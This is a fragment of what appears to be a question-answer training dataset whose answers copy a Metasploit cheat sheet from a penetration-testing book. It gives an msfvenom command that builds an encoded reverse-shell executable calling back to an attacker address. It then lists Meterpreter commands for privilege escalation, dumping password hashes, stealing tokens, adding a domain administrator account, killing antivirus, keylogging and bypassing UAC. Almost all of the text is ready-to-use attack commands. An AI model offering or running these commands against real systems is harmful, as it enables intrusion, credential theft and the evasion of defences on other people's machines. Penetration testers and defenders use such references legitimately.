for-\nmat with a name of payload.exe, and then have a multi-handler listening\nforit to execute.\nMSFvenom\nLeverage msfvenom, an all-in-one suite, to create and encode your payload:\nmsfvenom --payload\nwindows/meterpreter/reverse_tcp --format exe --encoder x86/shikata_ga_nai\nLHOST=172.16.1.32 LPORT=443 > msf.exe\n[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)\nroot@bt://opt/framework3/msf3#\nThis one liner will create a payload and automatically generate it in an\nexecutable format.\nCheat Sheet 281"
  },
  {
    "input": "What are the key Meterpreter commands used for post-exploitation activities on Windows, macOS, and Linux systems?",
    "summary": "Meterpreter is a post-exploitation module used to elevate permissions on Windows systems, steal domain administrator tokens, and disable firewall protections. It also allows for capturing keystrokes, bypassing User Access Control, and identifying if a system is a virtual machine. Additionally, Meterpreter can be used to dump hashes on macOS and Linux systems and to run various scripts to evade detection and maintain access.",
    "output": "Meterpreter Post Exploitation Commands\nElevate your permissions on Windows-based systems using Meterpreter:\nmeterpreter > use priv\nmeterpreter > getsystem\nSteal a domain administrator token from a given process ID, add a\ndomain account, and then add it to the Domain Admins group:\nmeterpreter > ps\nmeterpreter > steal_token 1784\nmeterpreter > shell\nC:\\Windows\\system32>net user metasploit p@55w0rd /ADD /DOMAIN\nC:\\Windows\\system32>net group \"Domain Admins\" metasploit /ADD /DOMAIN\nDump password hashes from the SAM database:\nmeterpreter > use priv\nmeterpreter > getsystem\nmeterpreter > hashdump\nNOTE On Win2k8 you may need to migrate to a process that is running as SYSTEM if\ngetsystem and hashdump throw exceptions.\nAutomigrate to a separate process:\nmeterpreter > run migrate\nKill antivirus processes running on the target via the killav Meterpreter\nscript:\nmeterpreter > run killav\nCapture keystrokes on target machines from within a particular process:\nmeterpreter > ps\nmeterpreter > migrate 1436\nmeterpreter > keyscan_start\nmeterpreter > keyscan_dump\nmeterpreter > keyscan_stop\nUse Incognito to impersonate an administrator:\nmeterpreter > use incognito\nmeterpreter > list_tokens -u\nmeterpreter > use priv\nmeterpreter > getsystem\n282 Appendix B\nmeterpreter > list_tokens -u\nmeterpreter > impersonate_token IHAZSECURITY\\\\Administrator\nSee what protection mechanisms are in place on the compromised\ntarget, display the help menu, disable Windows Firewall, and kill all counter-\nmeasures found:\nmeterpreter > run getcountermeasure\nmeterpreter > run getcountermeasure -h\nmeterpreter > run getcountermeasure -d -k\nIdentify whether the compromised system is a virtual machine:\nmeterpreter > run checkvm\nDrop into a command shell for a current Meterpreter console session:\nmeterpreter > shell\nGet a remote GUI (VNC) on the target machine:\nmeterpreter > run vnc\nBackground a currently running Meterpreter console:\nmeterpreter > background\nBypass Windows User Access Control:\nmeterpreter > run post/windows/escalate/bypassuac\nDump Hashes on an OS X system:\nmeterpreter > run post/osx/gather/hashdump\nDump Hashes on a Linux system:\nmeterpreter > run post/linux/gather/hashdump\nCheat Sheet 283"
  }
]